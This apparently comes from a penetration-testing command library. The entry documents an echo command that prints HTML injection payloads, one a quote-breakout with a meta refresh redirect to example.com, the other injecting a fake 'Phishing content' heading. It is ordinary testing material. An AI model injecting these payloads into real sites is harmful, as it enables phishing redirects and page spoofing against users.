---
id: cmd-uuid-2
data: 'echo ''"''><meta http-equiv="refresh" content="1; http://example.com">'''
tags:
  - payload
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:23.620Z'
verified: false
validated: true
submitted: true
---
# echo-payload

## Command

```bash
echo '"'><meta http-equiv="refresh" content="1; http://example.com">'
```

## Description

Outputs a sample HTML injection payload for open redirect testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Payload string | The HTML to echo | Yes |

## Examples

### Basic Usage

```bash
echo '"'><meta http-equiv="refresh" content="1; http://example.com">'
```

### Advanced Usage

```bash
echo 'e587d1d6ceb"><h1>Phishing content</h1><!--'
```

## Expected Output

Raw payload string printed to stdout, ready for encoding.

## Related

- [[commands/url-encode-payload]]
